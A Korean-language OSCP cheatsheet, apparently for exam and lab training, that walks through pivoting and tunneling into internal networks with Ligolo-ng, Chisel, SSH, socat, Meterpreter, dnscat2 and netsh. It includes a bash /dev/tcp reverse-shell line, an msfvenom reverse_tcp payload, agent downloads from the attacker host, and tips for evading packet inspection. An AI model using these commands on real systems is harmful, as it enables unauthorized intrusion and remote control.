---
title: "피벗팅 & 터널링 (Pivoting & Tunneling)"
date: 2026-06-20
weight: 110
draft: false
tags: ["oscp", "cheatsheet"]
summary: "침투한 호스트를 발판으로 Kali가 닿지 않는 내부 네트워크로 나아가는 도구별 절차."
---

침투한 호스트를 발판으로 Kali가 직접 닿지 않는 내부 네트워크로 나아가는 도구별 절차.

- 출처: https://heretek.dev/oscp-cheatsheet/pivoting-and-tunneling/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 의사결정 트리 (Decision Tree)

```text
SSH available on pivot host?
  YES → sshuttle (easiest, VPN-like)
  NO ↓

Need full subnet access?
  YES → Ligolo-ng (TUN interface, no proxychains)
  NO ↓

Need one or two ports?
  YES → Chisel reverse port forward
  NO ↓

Need SOCKS proxy?
  YES → Chisel reverse SOCKS
```

## Ligolo-ng (OSCP AD 피벗에 최선 — ← 선호)

- TUN 인터페이스를 만든다. proxychains 없이 도구를 직접 실행한다.

```bash
# === ATTACKER SETUP ===
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601

# === TRANSFER AGENT TO PIVOT HOST ===
./agent -connect ATTACKER:11601 -ignore-cert      # Linux
agent.exe -connect ATTACKER:11601 -ignore-cert     # Windows

# === CONFIGURE TUNNEL (in ligolo proxy console) ===
» session                                # select session
» ifconfig                              # find internal subnet
» start                                 # activate tunnel

# On Kali (new terminal):
sudo ip route add 10.10.10.0/24 dev ligolo

# Now use tools DIRECTLY (no proxychains):
nmap -sT -Pn 10.10.10.0/24
evil-winrm -i 10.10.10.5 -u admin -p password
impacket-psexec 'DOMAIN/user:pass'@10.10.10.5

# Catch reverse shells from internal network:
» listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## Chisel (가벼운 대안)

### 리버스 SOCKS 프록시 (가장 흔함)

```bash
# Attacker:
./chisel server -p 8080 --reverse

# Target:
.\chisel client $KALI:9001 R:socks

# Use:
proxychains -q nmap -sT -Pn <internal_ip>
```

### 단일 포트 포워드

```bash
# Target:
./chisel client ATTACKER:8080 R:3389:INTERNAL_HOST:3389
```

### 다중 포트 포워드

```bash
# Target:
./chisel client ATTACKER:8080 R:3389:10.10.10.5:3389 R:5985:10.10.10.5:5985
```

## Socat 포트 포워딩 (SSH 불필요)

- Socat은 Linux 타깃에 기본 설치된 경우가 많다. 단순 포트 포워드에는 SSH보다 간단하다.

```bash
# Forward port on pivot to internal target
# Syntax: socat TCP-LISTEN:<local_port>,fork TCP:<internal_target>:<target_port>

# Example: forward pivot:2345 → internal_db:5432
socat -ddd TCP-LISTEN:2345,fork TCP:$TARGET:5432
# From Kali: psql -h PIVOT_IP -p 2345

# Example: forward pivot:2222 → internal_ssh:22
socat TCP-LISTEN:2222,fork TCP:$TARGET:22
# From Kali: ssh user@PIVOT_IP -p 2222
```

- `-ddd` = 상세 출력(디버깅에 유용). `fork` = 다중 연결 처리.
- Socat은 포그라운드로 실행된다. 백그라운드로 돌리려면 `&` 또는 `nohup` 사용.

## SSH 터널링 (SSH를 쓸 수 있을 때)

```bash
# LOCAL port forward (Kali:localport → through pivot → internal:targetport)
ssh -N -L 8080:INTERNAL_IP:80 user@PIVOT
# Now on Kali: curl http://127.0.0.1:8080 → reaches INTERNAL_IP:80

# LOCAL port forward ON the pivot itself (opens a port on pivot → deeper host)
# Run this ON the pivot host after SSH'ing in:
ssh -N -L 0.0.0.0:4455:DEEPER_HOST:445 user@DEEPER_HOST
# 0.0.0.0 makes it listen on all interfaces so Kali can reach it
# From Kali: smbclient //PIVOT_IP:4455/share

# DYNAMIC SOCKS proxy (forward all traffic through pivot)
ssh -N -D 1080 user@PIVOT
# proxychains config: socks5 127.0.0.1 1080
# proxychains -q nmap -sT -Pn INTERNAL_IP

# REMOTE port forward (pivot → Kali — use when you can't SSH TO pivot from Kali)
# Run FROM the pivot:
ssh -N -R 127.0.0.1:2345:INTERNAL_IP:5432 kali@KALI_IP
# Now on Kali: psql -h 127.0.0.1 -p 2345

# REMOTE DYNAMIC SOCKS (reverse SOCKS — pivot initiates connection back to Kali)
# On Kali first: ssh into pivot, then:
ssh -N -R 1080 user@PIVOT
# On Kali: proxychains config: socks5 127.0.0.1 1080
# This creates a SOCKS proxy on Kali that routes through the pivot

# sshuttle (VPN-like — easiest if SSH available)
sshuttle -r user@PIVOT 10.10.10.0/24 -x PIVOT_IP

# ProxyJump (SSH through a jump host in one command)
ssh -J user@PIVOT user@INTERNAL_IP
```

SSH 터널링 플래그 치트시트:

```text
-L = Local forward    (Kali listens, traffic goes OUT through pivot)
-R = Remote forward   (Pivot sends traffic BACK to Kali)
-D = Dynamic SOCKS    (Kali gets a SOCKS proxy through pivot)
-N = No shell         (just the tunnel, no interactive session)
-f = Background       (run tunnel in background)
```

## Proxychains 설정

```text
# /etc/proxychains4.conf — use dynamic_chain
socks5 127.0.0.1 1080
```

- (중요) proxychains을 통한 nmap은 반드시 `-sT`(TCP connect 스캔)와 `-Pn`(핑 생략)을 사용한다.

```bash
proxychains -q nmap -sT -Pn -p 21,22,80,445,3389,5985 <internal_ip>
```

## 이중 / 중첩 피벗 (Attacker → Pivot1 → Pivot2 → Target)

Ligolo-ng 이중 피벗이 기본 선택 (권장 ← 선호). Chisel은 Ligolo가 깨질 때의 대안.

네트워크 구성:

```text
NETWORK LAYOUT:
  Kali (10.10.14.x)
    ↓ agent connects back to Kali:11601
  Pivot1 (10.10.14.x / 172.16.1.x)     ← first tunnel (tun: ligolo)
    ↓ agent connects to Pivot1:11602 (forwarded to Kali:11601)
  Pivot2 (172.16.1.x / 192.168.1.x)    ← second tunnel (tun: ligolo2)
    ↓
  Target (192.168.1.x)
```

### Step 1 — 첫 번째 피벗 (단일 피벗과 동일)

```bash
# On Kali: create TUN + start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On Pivot1: connect agent back to Kali
./agent -connect KALI_IP:11601 -ignore-cert

# In ligolo proxy console (on Kali):
» session                       # select Pivot1 session
» ifconfig                      # note Pivot1's internal IP (172.16.1.x)
» start                         # start tunnel on default 'ligolo' tun

# On Kali (new terminal): add route to first internal network
sudo ip route add $TARGET/24 dev ligolo

# VERIFY: you can now reach $TARGET/24 from Kali
nmap -sT -Pn -p 445 172.16.1.X
```

### Step 2 — 에이전트를 Pivot2로 전송

```bash
# On Kali: serve the agent binary (Linux or Windows version)
python3 -m http.server 80

# From Pivot2 (through the tunnel — Kali can now reach it):
# Linux:
wget http://KALI_IP/agent -O /tmp/agent && chmod +x /tmp/agent
# Windows:
certutil -urlcache -f http://KALI_IP/agent.exe C:\temp\agent.exe

# If Pivot2 can't reach Kali directly, upload agent TO Pivot1 first,
# then transfer from Pivot1 → Pivot2 via SMB/SCP/HTTP
```

### Step 3 — Pivot2의 에이전트가 Kali 프록시에 닿게 할 리스너 생성

- (중요) Pivot2는 Kali에 직접 닿을 수 없다(다른 네트워크). Pivot1에 Kali 프록시로 포워드하는 리스너를 추가한다.

```bash
# IMPORTANT: Pivot2 can't reach Kali directly (different network).
# So we add a listener on Pivot1 that forwards to Kali's proxy.

# In ligolo proxy console — select the PIVOT1 session first:
» session                       # pick Pivot1
» listener_add --addr 0.0.0.0:11602 --to 0.0.0.0:11601 --tcp
# This means: anything hitting Pivot1:11602 gets forwarded to Kali:11601
```

### Step 4 — Pivot2 에이전트 연결 + 두 번째 터널 생성

```bash
# On Pivot2: connect agent to Pivot1 (which forwards to Kali's proxy)
./agent -connect 172.16.1.PIVOT1:11602 -ignore-cert
# The agent connects to Pivot1:11602 → forwarded to Kali:11601 → proxy sees new session

# On Kali: create SECOND tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# In ligolo proxy console:
» session                       # you'll see TWO sessions now — pick the NEW one (Pivot2)
» ifconfig                      # note Pivot2's deeper internal IP (192.168.1.x)
» start --tun ligolo2           # start on the SECOND tun interface

# On Kali (new terminal): add route to second internal network
sudo ip route add 192.168.1.0/24 dev ligolo2

# VERIFY: you can now reach 192.168.1.0/24 from Kali
nmap -sT -Pn -p 445 192.168.1.X
```

이제 Kali에서 두 내부 네트워크 모두에 직접 닿을 수 있다:

```bash
# First network (through ligolo tun):
nmap -sT -Pn $TARGET/24
# Second network (through ligolo2 tun):
nmap -sT -Pn 192.168.1.0/24
evil-winrm -i 192.168.1.5 -u admin -p password
```

### 이중 피벗 너머에서 리버스 셸 받기

- Target(192.168.1.x)이 보내는 리버스 셸은 Pivot2에만 닿을 수 있다. 리스너를 Kali까지 체이닝해야 한다.

```bash
# Step 1: In ligolo console — select the PIVOT2 session
» session                       # pick Pivot2
» listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# This means: Target connects to Pivot2:4444 → forwarded to Kali:4444

# Step 2: On Kali — start your listener
nc -lvnp 4444

# Step 3: On Target — reverse shell points to PIVOT2's IP on the shared network
bash -c 'bash -i >& /dev/tcp/192.168.1.PIVOT2/4444 0>&1'
# Flow: Target → Pivot2:4444 → listener_add → Kali:4444 → shell!
```

### Chisel 이중 피벗 (대안 — Ligolo가 깨질 때 사용)

```bash
# Hop 1: Pivot1 → Kali
# On Kali:
chisel server -p 8080 --reverse
# On Pivot1:
./chisel client KALI_IP:8080 R:socks
# Now Kali has SOCKS on 127.0.0.1:1080 into $TARGET/24

# Hop 2: Pivot2 → Pivot1
# On Pivot1 — start a second chisel server:
./chisel server -p 9090 --reverse
# On Pivot2:
./chisel client 172.16.1.PIVOT1:9090 R:1081:socks
# Now Pivot1 has SOCKS on 127.0.0.1:1081 into 192.168.1.0/24
# But we need this on KALI — so forward port 1081 through hop 1:
# On Pivot1:
./chisel client KALI_IP:8080 R:1081:127.0.0.1:1081

# On Kali — chain both SOCKS in /etc/proxychains4.conf:
# dynamic_chain (NOT strict_chain — strict fails if one hop drops)
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# Use proxychains for all tools into the deep network:
proxychains -q nmap -sT -Pn -p 445,5985 192.168.1.0/24
proxychains -q evil-winrm -i 192.168.1.5 -u admin -p password
```

- ← 선호: Ligolo-ng가 기본. proxychains 불필요, 도구가 네이티브로 동작, 덜 깨진다. Chisel은 Ligolo가 실패했을 때만.

## HTTP 터널링 (DPI가 SSH/RAW TCP를 막을 때)

- 사용 시나리오: 심층 패킷 검사(DPI)가 HTTP/HTTPS 외의 트래픽을 전부 막을 때. Chisel은 트래픽을 HTTP로 감싸고 내부적으로 SSH로 암호화한다.

### Chisel HTTP 터널 (DPI 통과)

```bash
# On Kali — start Chisel server
./chisel server -p 8080 --reverse

# On compromised host — connect back over HTTP
./chisel client KALI_IP:8080 R:socks

# Now use proxychains for internal network access
proxychains -q nmap -sT -Pn -p 445,5985 INTERNAL_IP
proxychains -q evil-winrm -i INTERNAL_IP -u user -p pass
```

- DPI를 통과하는 이유: Chisel이 모든 트래픽을 HTTP 요청 안에 캡슐화한다. DPI에는 평범한 HTTP 트래픽으로 보이고, 내부의 SSH 암호화가 내용 검사를 막는다.

단일 포트 포워드 (HTTP 경유):

```bash
# Forward specific internal port to Kali
./chisel client KALI_IP:8080 R:5985:INTERNAL_IP:5985
# Now on Kali: evil-winrm -i 127.0.0.1 -u user -p pass
```

## Meterpreter 피벗 (이미 Meterpreter 세션이 있을 때)

- Ligolo/Chisel의 대안. autoroute + SOCKS 프록시를 사용한다.

```bash
# Step 1: Create staged Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o met.exe

# Step 2: Start handler
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run

# Step 3: Upload and execute met.exe on pivot host → session opens

# Step 4: Add route to internal network through the session
use multi/manage/autoroute
set session 1
run
# Autoroute discovers internal subnets and adds routes automatically

# Step 5: Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

`/etc/proxychains4.conf`에 `socks5 127.0.0.1 1080` 설정 후 proxychains로 사용:

```bash
proxychains -q nmap -sT -Pn -p 445,3389,5985 INTERNAL_SUBNET/24
proxychains -q evil-winrm -i INTERNAL_IP -u USER -p PASS
proxychains -q impacket-psexec 'DOMAIN/USER:PASS'@INTERNAL_IP
```

단일 포트 포워드 (SOCKS 없이):

```text
meterpreter> portfwd add -l 4455 -p 445 -r INTERNAL_IP
# Now on Kali: smbclient //127.0.0.1:4455/share
```

## DNS 터널링 (DNS 트래픽만 허용될 때)

- 사용 시나리오: 타깃이 DNS 질의(53 포트)만 가능할 때. 매우 느리지만 다른 방법이 전부 막혔을 때 동작한다. 도구: dnscat2.

### 셋업

```bash
# On Kali — start DNS server
sudo dnscat2-server <your_domain>
# Or without a domain (direct IP mode):
sudo dnscat2-server --dns host=0.0.0.0,port=53

# On target — connect via DNS
./dnscat --dns server=KALI_IP
# Windows: dnscat2-v0.07-client-win32.exe --dns server=KALI_IP
```

### dnscat2 세션 사용

```text
dnscat2> windows              # list active sessions
dnscat2> window -i 1          # interact with session
command (client01)> shell     # spawn a shell
command (client01)> download C:\Users\admin\Desktop\proof.txt
```

### DNS 터널을 통한 포트 포워딩

```text
command (client01)> listen 127.0.0.1:4444 INTERNAL_IP:445
# Now Kali can access INTERNAL_IP:445 via 127.0.0.1:4444
```

- DNS 터널링은 극도로 느리다. HTTP 터널링까지 실패한 최후의 수단으로만 사용한다.

## Windows 포트 포워딩 (외부 도구 없이)

- 사용 시나리오: Ligolo/Chisel을 타깃에 업로드할 수 없을 때.

### netsh (Windows 내장)

```powershell
# Forward local port to internal target
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_IP

# Verify
netsh interface portproxy show all

# Remove when done
netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
```

- (중요) 방화벽 규칙도 거의 항상 필요하다. Windows 방화벽이 인바운드를 막고 있으면 portproxy만으로는 무용지물.

```powershell
# Poke a hole in the firewall for the forwarded port
netsh advfirewall firewall add rule name="port_fwd_4455" protocol=TCP dir=in localport=4455 action=allow

# CLEAN UP when done (don't leave holes open)
netsh advfirewall firewall delete rule name="port_fwd_4455"
```

- Kali에서: `smbclient //PIVOT_IP:4455/share`

### ssh.exe (Windows 10 1803+ / Server 2019+ 내장)

```powershell
# Check if available
where ssh
# Typically at C:\Windows\System32\OpenSSH\ssh.exe

# Remote dynamic SOCKS (same syntax as Linux SSH)
ssh -N -R 9998 kali@KALI_IP
# Now on Kali: proxychains with socks5 127.0.0.1 9998

# Remote port forward
ssh -N -R 127.0.0.1:4455:INTERNAL_IP:445 kali@KALI_IP
```

- ssh.exe는 원격 다이내믹을 포함한 모든 OpenSSH 기능을 지원한다. 사용 가능하면 plink보다 우선한다.

### plink.exe (PuTTY CLI — ssh.exe가 없을 때 대체)

```powershell
# Remote port forward (target → Kali)
plink.exe -ssh -l kali -pw kalipass -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
```

- (중요) Plink는 원격 다이내믹 포트 포워딩(`-R socks`)을 지원하지 않는다. SOCKS에는 ssh.exe나 Chisel을 사용한다.
- Kali에서 plink.exe 위치: `/usr/share/windows-resources/binaries/plink.exe`
